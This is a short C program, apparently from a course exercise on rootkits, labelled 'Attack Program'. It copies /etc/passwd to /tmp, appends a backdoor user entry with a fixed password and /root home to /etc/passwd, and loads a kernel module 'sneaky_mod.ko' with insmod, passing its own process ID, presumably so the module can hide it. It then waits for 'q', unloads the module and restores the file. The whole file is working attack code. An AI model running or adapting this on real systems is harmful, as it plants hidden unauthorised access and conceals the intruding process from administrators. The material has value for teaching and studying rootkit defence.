#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>
// Attack Program:

// 1.print its own process ID to the screen
void printPid(){
    printf("sneaky_process pid = %d\n", getpid());
}

// 2.copy the /etc/passwd file (used for user authentication) to a new file: /tmp/passwd
//   open the /etc/passwd file and print a new line to the end of the file that contains a 
//   username and password that may allow a desired user to authenticate to the system.
void performMaliciousAct(){
    system("cp /etc/passwd /tmp");
    system("echo 'sneakyuser:abc123:2000:2000:sneakyuser:/root:bash' >> /etc/passwd");
}

// 3.load the sneaky module (sneaky_mod.ko) using the “insmod” command
void loadModule(){
    char module_array[80];
    sprintf(module_array, "insmod sneaky_mod.ko pid=%d", (int)getpid());
    system(module_array);
}

// 4.enter a loop, reading a character at a time from the keyboard input until it receives 
//   the character ‘q’ (for quit)
void readInput(){
    char target;
    while ((target = getchar()) != 'q') {
  }
}

// 5.unload the sneaky kernel module using the “rmmod” command
void unloadModule(){
    system("rmmod sneaky_mod.ko");
}

// 6.restore the /etc/passwd file (and remove the addition of “sneakyuser” authentication 
//   information) by copying /tmp/passwd to /etc/passwd.
void restoreMaliciousAct(){
    system("cp /tmp/passwd /etc");
    system("rm /tmp/passwd");
}


int main(){
    printPid();

    performMaliciousAct();

    loadModule(); 

    readInput();

    unloadModule();
    
    restoreMaliciousAct();
}